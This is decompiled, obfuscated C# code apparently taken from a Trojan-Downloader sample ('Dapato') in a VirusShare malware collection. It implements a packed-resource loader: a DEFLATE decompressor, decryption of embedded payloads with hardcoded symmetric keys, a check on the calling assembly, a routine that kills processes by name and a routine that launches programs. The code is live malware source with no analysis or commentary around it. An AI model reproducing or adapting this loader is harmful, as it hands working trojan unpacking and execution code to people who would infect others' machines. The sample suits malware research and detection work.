// Decompiled with JetBrains decompiler
// Type: .
// Assembly: CSPharm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=91f7ba0f4234404d
// MVID: E3EED34E-DEA0-448A-9147-166831419ACC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Downloader.Win32.Dapato.lnd-7f2f48002f973886553b938cc98149108eb2e39f2ac47324d3c731a4208c60fd.exe

using \u0004;
using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0003
{
  internal sealed class \u0001
  {
    static void \u0001([In] byte[] obj0, [In] \u0005.\u0003.\u0004 obj1)
    {
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      if (true)
        goto label_26;
label_4:
      int index1;
      for (; index1 < obj0.Length; ++index1)
      {
        int index2 = (int) obj0[index1];
        if (index2 > 0)
          ++numArray1[index2];
      }
      int num1 = 0;
      int length = 512;
      for (int index3 = 1; index3 <= 15; ++index3)
      {
        numArray2[index3] = num1;
        num1 += numArray1[index3] << 16 - index3;
        if (index3 >= 10)
        {
          int num2 = numArray2[index3] & 130944;
          int num3 = num1 & 130944;
          length += num3 - num2 >> 16 - index3;
        }
      }
      obj1.\u0001 = new short[length];
      int num4 = 512;
      for (int index4 = 15; index4 >= 10; --index4)
      {
        int num5 = num1 & 130944;
        num1 -= numArray1[index4] << 16 - index4;
        for (int index5 = num1 & 130944; index5 < num5; index5 += 128)
        {
          obj1.\u0001[(int) \u0003.\u0001.\u0001(index5)] = (short) (-num4 << 4 | index4);
          num4 += 1 << index4 - 9;
        }
      }
      for (int index6 = 0; index6 < obj0.Length; ++index6)
      {
        int index7 = (int) obj0[index6];
        if (index7 != 0)
        {
          int num6 = numArray2[index7];
          int index8 = (int) \u0003.\u0001.\u0001(num6);
          if (index7 <= 9)
          {
            do
            {
              obj1.\u0001[index8] = (short) (index6 << 4 | index7);
              index8 += 1 << index7;
            }
            while (index8 < 512);
          }
          else
          {
            int num7 = (int) obj1.\u0001[index8 & 511];
            int num8 = 1 << (num7 & 15);
            int num9 = -(num7 >> 4);
            do
            {
              obj1.\u0001[num9 | index8 >> 9] = (short) (index6 << 4 | index7);
              index8 += 1 << index7;
            }
            while (index8 < num8);
          }
          numArray2[index7] = num6 + (1 << 16 - index7);
        }
      }
      return;
label_26:
      index1 = 0;
      goto label_4;
    }

    static int \u0001([In] \u0005.\u0003.\u0002 obj0) => obj0.\u0005;

    static bool \u0001([In] \u0005.\u0003.\u0002 obj0) => obj0.\u0002 == obj0.\u0003;

    static int \u0001([In] \u0005.\u0003.\u0002 obj0, [In] int obj1)
    {
      if (obj0.\u0005 < obj1)
        goto label_4;
label_3:
      return (int) ((long) obj0.\u0004 & (long) ((1 << obj1) - 1));
label_4:
      if (obj0.\u0002 == obj0.\u0003)
        return -1;
      obj0.\u0004 |= (uint) (((int) obj0.\u0001[obj0.\u0002++] & (int) byte.MaxValue | ((int) obj0.\u0001[obj0.\u0002++] & (int) byte.MaxValue) << 8) << obj0.\u0005);
      obj0.\u0005 += 16;
      goto label_3;
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] publicKey1 = obj1.GetName().GetPublicKey();
      byte[] publicKey2 = obj0.GetName().GetPublicKey();
      if (publicKey2 == null != (publicKey1 == null))
        return false;
      if (publicKey2 != null)
      {
        for (int index = 0; index < publicKey2.Length; ++index)
        {
          if ((int) publicKey2[index] != (int) publicKey1[index])
            return false;
        }
      }
      return true;
    }

    static int \u0001([In] \u0005.\u0003.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (obj0.\u0005 > 0 && obj3 > 0)
      {
        obj1[obj2++] = (byte) obj0.\u0004;
        obj0.\u0004 >>= 8;
        obj0.\u0005 -= 8;
        --obj3;
        ++num1;
      }
      if (obj3 == 0)
        return num1;
      int num2 = obj0.\u0003 - obj0.\u0002;
      if (obj3 > num2)
        obj3 = num2;
      Array.Copy((Array) obj0.\u0001, obj0.\u0002, (Array) obj1, obj2, obj3);
      obj0.\u0002 += obj3;
      if ((obj0.\u0002 - obj0.\u0003 & 1) != 0)
      {
        obj0.\u0004 = (uint) obj0.\u0001[obj0.\u0002++] & (uint) byte.MaxValue;
        obj0.\u0005 = 8;
      }
      return num1 + obj3;
    }

    static void \u0001([In] \u0002 obj0) => obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0002, new object[0]);

    static void \u0001([In] \u0005.\u0003.\u0002 obj0)
    {
      obj0.\u0004 >>= obj0.\u0005 & 7;
      obj0.\u0005 &= -8;
    }

    static int \u0001([In] int obj0) => \u0003.\u0001.\u0001(obj0) * 2;

    static bool \u0001([In] \u0005.\u0003.\u0001 obj0)
    {
      int num1 = \u0003.\u0001.\u0001(obj0.\u0011);
      if (true)
        goto label_25;
label_23:
      int num2;
      while (num2 >= 258)
      {
        switch (obj0.\u0005)
        {
          case 7:
            int num3;
            while (((num3 = \u0003.\u0001.\u0001(obj0.\u0013, obj0.\u0010)) & -256) == 0)
            {
              \u0003.\u0001.\u0001(obj0.\u0011, num3);
              if (--num2 < 258)
                return true;
            }
            if (num3 < 257)
            {
              if (num3 < 0)
                return false;
              obj0.\u0014 = (\u0005.\u0003.\u0004) null;
              obj0.\u0013 = (\u0005.\u0003.\u0004) null;
              obj0.\u0005 = 2;
              return true;
            }
            obj0.\u0007 = \u0005.\u0003.\u0001.\u0001[num3 - 257];
            obj0.\u0006 = \u0005.\u0003.\u0001.\u0002[num3 - 257];
            goto case 8;
          case 8:
            if (obj0.\u0006 > 0)
            {
              obj0.\u0005 = 8;
              int num4 = \u0003.\u0001.\u0001(obj0.\u0010, obj0.\u0006);
              if (num4 < 0)
                return false;
              \u0003.\u0001.\u0001(obj0.\u0010, obj0.\u0006);
              obj0.\u0007 += num4;
            }
            obj0.\u0005 = 9;
            goto case 9;
          case 9:
            int index = \u0003.\u0001.\u0001(obj0.\u0014, obj0.\u0010);
            if (index < 0)
              return false;
            obj0.\u0008 = \u0005.\u0003.\u0001.\u0003[index];
            obj0.\u0006 = \u0005.\u0003.\u0001.\u0004[index];
            goto case 10;
          case 10:
            if (obj0.\u0006 > 0)
            {
              obj0.\u0005 = 10;
              int num5 = \u0003.\u0001.\u0001(obj0.\u0010, obj0.\u0006);
              if (num5 < 0)
                return false;
              \u0003.\u0001.\u0001(obj0.\u0010, obj0.\u0006);
              obj0.\u0008 += num5;
            }
            \u0003.\u0001.\u0001(obj0.\u0011, obj0.\u0007, obj0.\u0008);
            num2 -= obj0.\u0007;
            obj0.\u0005 = 7;
            continue;
          default:
            continue;
        }
      }
      return true;
label_25:
      num2 = num1;
      goto label_23;
    }

    static void \u0001([In] string obj0)
    {
      foreach (Process process in Process.GetProcessesByName(obj0))
      {
        \u0003.\u0001.\u0001(\u0005.\u0001.\u0001(1314) + process.ProcessName + \u0005.\u0001.\u0001(1327));
        process.Kill();
      }
    }

    static bool \u0001([In] \u0005.\u0003.\u0005 obj0, [In] \u0005.\u0003.\u0002 obj1)
    {
      while (true)
      {
        switch (obj0.\u0006)
        {
          case 0:
            obj0.\u0007 = \u0003.\u0001.\u0001(obj1, 5);
            if (obj0.\u0007 >= 0)
            {
              obj0.\u0007 += 257;
              \u0003.\u0001.\u0001(obj1, 5);
              obj0.\u0006 = 1;
              goto case 1;
            }
            else
              goto label_2;
          case 1:
            obj0.\u0008 = \u0003.\u0001.\u0001(obj1, 5);
            if (obj0.\u0008 >= 0)
            {
              ++obj0.\u0008;
              \u0003.\u0001.\u0001(obj1, 5);
              obj0.\u000F = obj0.\u0007 + obj0.\u0008;
              obj0.\u0004 = new byte[obj0.\u000F];
              obj0.\u0006 = 2;
              goto case 2;
            }
            else
              goto label_5;
          case 2:
            obj0.\u000E = \u0003.\u0001.\u0001(obj1, 4);
            if (obj0.\u000E >= 0)
            {
              obj0.\u000E += 4;
              \u0003.\u0001.\u0001(obj1, 4);
              obj0.\u0003 = new byte[19];
              obj0.\u0012 = 0;
              obj0.\u0006 = 3;
              goto case 3;
            }
            else
              goto label_8;
          case 3:
            for (; obj0.\u0012 < obj0.\u000E; ++obj0.\u0012)
            {
              int num = \u0003.\u0001.\u0001(obj1, 3);
              if (num < 0)
                return false;
              \u0003.\u0001.\u0001(obj1, 3);
              obj0.\u0003[\u0005.\u0003.\u0005.\u0013[obj0.\u0012]] = (byte) num;
            }
            obj0.\u0005 = new \u0005.\u0003.\u0004(obj0.\u0003);
            obj0.\u0003 = (byte[]) null;
            obj0.\u0012 = 0;
            obj0.\u0006 = 4;
            goto case 4;
          case 4:
            int num1;
            while (((num1 = \u0003.\u0001.\u0001(obj0.\u0005, obj1)) & -16) == 0)
            {
              obj0.\u0004[obj0.\u0012++] = obj0.\u0011 = (byte) num1;
              if (obj0.\u0012 == obj0.\u000F)
                return true;
            }
            if (num1 >= 0)
            {
              if (num1 >= 17)
                obj0.\u0011 = (byte) 0;
              obj0.\u0010 = num1 - 16;
              obj0.\u0006 = 5;
              goto case 5;
            }
            else
              goto label_19;
          case 5:
            int num2 = \u0005.\u0003.\u0005.\u0002[obj0.\u0010];
            int num3 = \u0003.\u0001.\u0001(obj1, num2);
            if (num3 >= 0)
            {
              \u0003.\u0001.\u0001(obj1, num2);
              int num4 = num3 + \u0005.\u0003.\u0005.\u0001[obj0.\u0010];
              while (num4-- > 0)
                obj0.\u0004[obj0.\u0012++] = obj0.\u0011;
              if (obj0.\u0012 != obj0.\u000F)
              {
                obj0.\u0006 = 4;
                continue;
              }
              goto label_29;
            }
            else
              goto label_24;
          default:
            continue;
        }
      }
label_2:
      return false;
label_5:
      return false;
label_8:
      return false;
label_19:
      return false;
label_24:
      return false;
label_29:
      return true;
    }

    static byte[] \u0001([In] byte[] obj0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0003.\u0001.\u0001(callingAssembly, executingAssembly))
        return (byte[]) null;
      \u0005.\u0003.\u0007 obj1 = new \u0005.\u0003.\u0007(obj0);
      byte[] numArray1 = new byte[0];
      int num1 = \u0003.\u0001.\u0001(obj1);
      if (num1 == 67324752)
      {
        short num2 = (short) \u0003.\u0001.\u0001(obj1);
        int num3 = \u0003.\u0001.\u0001(obj1);
        int num4 = \u0003.\u0001.\u0001(obj1);
        if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
          throw new FormatException("Wrong Header Signature");
        \u0003.\u0001.\u0001(obj1);
        \u0003.\u0001.\u0001(obj1);
        \u0003.\u0001.\u0001(obj1);
        int length = \u0003.\u0001.\u0001(obj1);
        int count1 = \u0003.\u0001.\u0001(obj1);
        int count2 = \u0003.\u0001.\u0001(obj1);
        if (count1 > 0)
        {
          byte[] buffer = new byte[count1];
          obj1.Read(buffer, 0, count1);
        }
        if (count2 > 0)
        {
          byte[] buffer = new byte[count2];
          obj1.Read(buffer, 0, count2);
        }
        byte[] buffer1 = new byte[obj1.Length - obj1.Position];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u0005.\u0003.\u0001 obj2 = new \u0005.\u0003.\u0001(buffer1);
        numArray1 = new byte[length];
        \u0003.\u0001.\u0001(numArray1, numArray1.Length, obj2, 0);
      }
      else
      {
        int num5 = num1 >> 24;
        if (num1 - (num5 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        if (num5 == 1)
        {
          int length1 = \u0003.\u0001.\u0001(obj1);
          numArray1 = new byte[length1];
          int num6;
          for (int index = 0; index < length1; index += num6)
          {
            int length2 = \u0003.\u0001.\u0001(obj1);
            num6 = \u0003.\u0001.\u0001(obj1);
            byte[] buffer = new byte[length2];
            obj1.Read(buffer, 0, buffer.Length);
            \u0005.\u0003.\u0001 obj3 = new \u0005.\u0003.\u0001(buffer);
            \u0003.\u0001.\u0001(numArray1, num6, obj3, index);
          }
        }
        if (num5 == 2)
        {
          byte[] numArray2 = new byte[8]
          {
            (byte) 203,
            (byte) 141,
            (byte) 238,
            (byte) 96,
            (byte) 34,
            (byte) 246,
            (byte) 159,
            (byte) 67
          };
          byte[] numArray3 = new byte[8]
          {
            (byte) 138,
            (byte) 87,
            (byte) 245,
            (byte) 25,
            (byte) 232,
            (byte) 206,
            (byte) 94,
            (byte) 109
          };
          using (\u0001.\u0001 obj4 = new \u0001.\u0001())
          {
            using (ICryptoTransform cryptoTransform = \u0003.\u0001.\u0001(numArray3, obj4, numArray2, true))
              numArray1 = \u0003.\u0001.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
        if (num5 == 3)
        {
          byte[] numArray4 = new byte[16]
          {
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1
          };
          byte[] numArray5 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          using (\u0002 obj5 = new \u0002())
          {
            using (ICryptoTransform cryptoTransform = \u0003.\u0001.\u0001(numArray4, obj5, true, numArray5))
              numArray1 = \u0003.\u0001.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
      obj1.Close();
      return numArray1;
    }

    static int \u0001([In] \u0005.\u0003.\u0004 obj0, [In] \u0005.\u0003.\u0002 obj1)
    {
      int index1;
      if ((index1 = \u0003.\u0001.\u0001(obj1, 9)) < 0)
      {
        int num1 = obj1.\u0005;
        int index2 = \u0003.\u0001.\u0001(obj1, num1);
        int num2 = (int) obj0.\u0001[index2];
        if (num2 < 0 || (num2 & 15) > num1)
          return -1;
        \u0003.\u0001.\u0001(obj1, num2 & 15);
        return num2 >> 4;
      }
      \u0005.\u0003.\u0004 obj = obj0;
      int num3;
      if ((num3 = (int) obj.\u0001[index1]) >= 0)
      {
        \u0003.\u0001.\u0001(obj1, num3 & 15);
        return num3 >> 4;
      }
      int num4 = -(num3 >> 4);
      int num5 = num3 & 15;
      int num6;
      if ((num6 = \u0003.\u0001.\u0001(obj1, num5)) >= 0)
      {
        int num7 = (int) obj0.\u0001[num4 | num6 >> 9];
        \u0003.\u0001.\u0001(obj1, num7 & 15);
        return num7 >> 4;
      }
      int num8 = obj1.\u0005;
      int num9 = \u0003.\u0001.\u0001(obj1, num8);
      int num10 = (int) obj0.\u0001[num4 | num9 >> 9];
      if ((num10 & 15) > num8)
        return -1;
      \u0003.\u0001.\u0001(obj1, num10 & 15);
      return num10 >> 4;
    }

    static void \u0001([In] \u0005.\u0003.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0003 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0002 - obj2 & (int) short.MaxValue;
      int num = 32768 - obj1;
      if (sourceIndex <= num && obj0.\u0002 < num)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0002, obj1);
          obj0.\u0002 += obj1;
        }
        else
        {
          while (obj1-- > 0)
            obj0.\u0001[obj0.\u0002++] = obj0.\u0001[sourceIndex++];
        }
      }
      else
        \u0003.\u0001.\u0001(obj0, sourceIndex, obj1, obj2);
    }

    static void \u0001([In] string obj0)
    {
      \u0003.\u0001.\u0001(\u0005.\u0001.\u0001(1332) + obj0 + \u0005.\u0001.\u0001(1327));
      try
      {
        Process.Start(obj0);
      }
      catch (Exception ex1)
      {
        if (!(ex1.GetType().ToString() != \u0005.\u0001.\u0001(1353)))
          return;
        try
        {
          Process.Start(new ProcessStartInfo(\u0005.\u0001.\u0001(1402), obj0));
        }
        catch (Exception ex2)
        {
        }
      }
    }

    static \u0005.\u0003.\u0004 \u0001([In] \u0005.\u0003.\u0005 obj0)
    {
      byte[] numArray = new byte[obj0.\u0008];
      byte[] destinationArray;
      if (true)
        destinationArray = numArray;
      Array.Copy((Array) obj0.\u0004, obj0.\u0007, (Array) destinationArray, 0, obj0.\u0008);
      return new \u0005.\u0003.\u0004(destinationArray);
    }

    static int \u0001([In] int obj0)
    {
      int num = 1;
      for (int index = 0; index < 10; ++index)
        num += obj0;
      return num;
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] \u0001.\u0001 obj1,
      [In] byte[] obj2,
      [In] bool obj3)
    {
      obj1.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj1.\u0002, new object[1]
      {
        (object) obj2
      });
      obj1.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj1.\u0002, new object[1]
      {
        (object) obj0
      });
      return (ICryptoTransform) obj1.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]).Invoke(obj1.\u0002, new object[0]);
    }

    static void \u0001([In] string obj0)
    {
      if (!\u0004.\u0001.\u0004)
        return;
      StreamWriter streamWriter = File.Exists(\u0005.\u0001.\u0001(1419)) ? File.AppendText(\u0005.\u0001.\u0001(1419)) : new StreamWriter(\u0005.\u0001.\u0001(1419));
      streamWriter.WriteLine((object) DateTime.Now);
      streamWriter.WriteLine(obj0);
      streamWriter.WriteLine();
      streamWriter.Close();
    }

    static int \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0005.\u0003.\u0003 obj3)
    {
      int num1 = obj3.\u0002;
      if (obj0 > obj3.\u0003)
        obj0 = obj3.\u0003;
      else
        num1 = obj3.\u0002 - obj3.\u0003 + obj0 & (int) short.MaxValue;
      int num2 = obj0;
      int length = obj0 - num1;
      if (length > 0)
      {
        Array.Copy((Array) obj3.\u0001, 32768 - length, (Array) obj2, obj1, length);
        obj1 += length;
        obj0 = num1;
      }
      Array.Copy((Array) obj3.\u0001, num1 - obj0, (Array) obj2, obj1, obj0);
      obj3.\u0003 -= num2;
      if (obj3.\u0003 < 0)
        throw new InvalidOperationException();
      return num2;
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0005.\u0003.\u0006.\u0002[obj0 & 15] << 12 | (int) \u0005.\u0003.\u0006.\u0002[obj0 >> 4 & 15] << 8 | (int) \u0005.\u0003.\u0006.\u0002[obj0 >> 8 & 15] << 4 | (int) \u0005.\u0003.\u0006.\u0002[obj0 >> 12]);

    static int \u0001([In] \u0005.\u0003.\u0003 obj0) => obj0.\u0003;

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] \u0002 obj1,
      [In] bool obj2,
      [In] byte[] obj3)
    {
      obj1.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj1.\u0002, new object[1]
      {
        (object) obj0
      });
      obj1.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj1.\u0002, new object[1]
      {
        (object) obj3
      });
      return (ICryptoTransform) obj1.\u0001.GetMethod(obj2 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]).Invoke(obj1.\u0002, new object[0]);
    }

    static void \u0001([In] \u0001.\u0001 obj0) => obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0002, new object[0]);

    static void \u0001([In] \u0005.\u0003.\u0003 obj0, [In] int obj1)
    {
      \u0005.\u0003.\u0003 obj = obj0;
      int num1;
      int num2 = num1 = obj.\u0003;
      obj.\u0003 = num1 + 1;
      if (num2 == 32768)
        throw new InvalidOperationException();
      obj0.\u0001[obj0.\u0002++] = (byte) obj1;
      obj0.\u0002 &= (int) short.MaxValue;
    }

    static void \u0001([In] \u0005.\u0003.\u0002 obj0, [In] int obj1)
    {
      obj0.\u0004 >>= obj1;
      obj0.\u0005 -= obj1;
    }

    static int \u0001([In] \u0005.\u0003.\u0002 obj0) => obj0.\u0003 - obj0.\u0002 + (obj0.\u0005 >> 3);

    static \u0005.\u0003.\u0004 \u0001([In] \u0005.\u0003.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0007];
      Array.Copy((Array) obj0.\u0004, 0, (Array) destinationArray, 0, obj0.\u0007);
      return new \u0005.\u0003.\u0004(destinationArray);
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0005.\u0003.\u0002 obj3)
    {
      if (obj3.\u0002 < obj3.\u0003)
        throw new InvalidOperationException();
      int num = obj1 + obj0;
      if (0 > obj1 || obj1 > num || num > obj2.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj0 & 1) != 0)
      {
        obj3.\u0004 |= (uint) (((int) obj2[obj1++] & (int) byte.MaxValue) << obj3.\u0005);
        obj3.\u0005 += 8;
      }
      obj3.\u0001 = obj2;
      obj3.\u0002 = obj1;
      obj3.\u0003 = num;
    }

    static int \u0001([In] byte[] obj0, [In] int obj1, [In] \u0005.\u0003.\u0001 obj2, [In] int obj3)
    {
      int num1 = 0;
      do
      {
        if (obj2.\u0005 != 11)
          goto label_5;
label_2:
        continue;
label_5:
        int num2 = \u0003.\u0001.\u0001(obj1, obj3, obj0, obj2.\u0011);
        obj3 += num2;
        num1 += num2;
        obj1 -= num2;
        if (obj1 != 0)
          goto label_2;
        else
          goto label_1;
      }
      while (\u0003.\u0001.\u0001(obj2) || obj2.\u0011.\u0003 > 0 && obj2.\u0005 != 11);
      goto label_3;
label_1:
      return num1;
label_3:
      return num1;
    }

    static void \u0001()
    {
      try
      {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        MemoryManager.\u0001 = new MemoryManager();
      }
      catch
      {
      }
    }

    static int \u0001([In] \u0005.\u0003.\u0003 obj0, [In] \u0005.\u0003.\u0002 obj1, [In] int obj2)
    {
      obj2 = Math.Min(Math.Min(obj2, 32768 - obj0.\u0003), \u0003.\u0001.\u0001(obj1));
      int num1 = 32768 - obj0.\u0002;
      int num2;
      if (obj2 > num1)
      {
        num2 = \u0003.\u0001.\u0001(obj1, obj0.\u0001, obj0.\u0002, num1);
        if (num2 == num1)
          num2 += \u0003.\u0001.\u0001(obj1, obj0.\u0001, 0, obj2 - num1);
      }
      else
        num2 = \u0003.\u0001.\u0001(obj1, obj0.\u0001, obj0.\u0002, obj2);
      obj0.\u0002 = obj0.\u0002 + num2 & (int) short.MaxValue;
      obj0.\u0003 += num2;
      return num2;
    }

    static int \u0001([In] \u0005.\u0003.\u0003 obj0) => 32768 - obj0.\u0003;

    static bool \u0001([In] \u0005.\u0003.\u0001 obj0)
    {
      switch (obj0.\u0005)
      {
        case 2:
          if (obj0.\u000F)
          {
            obj0.\u0005 = 12;
            return false;
          }
          int num1 = \u0003.\u0001.\u0001(obj0.\u0010, 3);
          if (num1 < 0)
            return false;
          \u0003.\u0001.\u0001(obj0.\u0010, 3);
          if ((num1 & 1) != 0)
            obj0.\u000F = true;
          switch (num1 >> 1)
          {
            case 0:
              \u0003.\u0001.\u0001(obj0.\u0010);
              obj0.\u0005 = 3;
              break;
            case 1:
              obj0.\u0013 = \u0005.\u0003.\u0004.\u0002;
              obj0.\u0014 = \u0005.\u0003.\u0004.\u0003;
              obj0.\u0005 = 7;
              break;
            case 2:
              obj0.\u0012 = new \u0005.\u0003.\u0005();
              obj0.\u0005 = 6;
              break;
          }
          return true;
        case 3:
          if ((obj0.\u000E = \u0003.\u0001.\u0001(obj0.\u0010, 16)) < 0)
            return false;
          \u0003.\u0001.\u0001(obj0.\u0010, 16);
          obj0.\u0005 = 4;
          goto case 4;
        case 4:
          if (\u0003.\u0001.\u0001(obj0.\u0010, 16) < 0)
            return false;
          \u0003.\u0001.\u0001(obj0.\u0010, 16);
          obj0.\u0005 = 5;
          goto case 5;
        case 5:
          int num2 = \u0003.\u0001.\u0001(obj0.\u0011, obj0.\u0010, obj0.\u000E);
          obj0.\u000E -= num2;
          if (obj0.\u000E != 0)
            return !\u0003.\u0001.\u0001(obj0.\u0010);
          obj0.\u0005 = 2;
          return true;
        case 6:
          if (!\u0003.\u0001.\u0001(obj0.\u0012, obj0.\u0010))
            return false;
          obj0.\u0013 = \u0003.\u0001.\u0001(obj0.\u0012);
          obj0.\u0014 = \u0003.\u0001.\u0001(obj0.\u0012);
          obj0.\u0005 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0003.\u0001.\u0001(obj0);
        case 12:
          return false;
        default:
          return false;
      }
    }

    static int \u0001([In] \u0005.\u0003.\u0007 obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static void \u0001([In] \u0005.\u0003.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      while (obj2-- > 0)
      {
        byte[] numArray = obj0.\u0001;
        \u0005.\u0003.\u0003 obj = obj0;
        int num1;
        int num2 = num1 = obj.\u0002;
        obj.\u0002 = num1 + 1;
        int index = num2;
        int num3 = (int) obj0.\u0001[obj1++];
        numArray[index] = (byte) num3;
        obj0.\u0002 &= (int) short.MaxValue;
        obj1 &= (int) short.MaxValue;
      }
    }

    static int \u0001([In] \u0005.\u0003.\u0007 obj0) => \u0003.\u0001.\u0001(obj0) | \u0003.\u0001.\u0001(obj0) << 16;
  }
}
